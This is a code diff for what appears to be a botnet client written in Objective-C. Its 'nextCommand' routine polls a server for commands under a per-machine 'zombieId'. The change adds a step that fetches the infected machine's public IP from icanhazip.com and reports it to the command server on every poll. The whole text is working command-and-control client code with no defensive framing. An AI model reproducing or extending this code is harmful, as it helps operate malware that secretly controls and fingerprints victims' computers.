@@ -96,11 +96,13 @@
 }
 
 +(NSArray *)nextCommand {
+    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
     [WTLogger neutral:@"nextCommand start"];
     WTConfig *config = [WTConfig getConfig];
     NSString *zombieId = [config getZombieId];
+    NSString *ip = [httpObj httpGetRequest:@"http://icanhazip.com/" usingData:nil];
     NSString *url = [NSString stringWithFormat:@"%@/next/command/%@", [config getBaseUrl], zombieId];
-    NSString *response = [[[WTHTTPApi alloc] init] httpGetRequest:url usingData:nil];
+    NSString *response = [httpObj httpGetRequest:url usingData:@{@"ip":ip}];
     NSDictionary *responseJson = [WTJsonParser parseJson:response];
     if (responseJson == nil) {
         return nil;
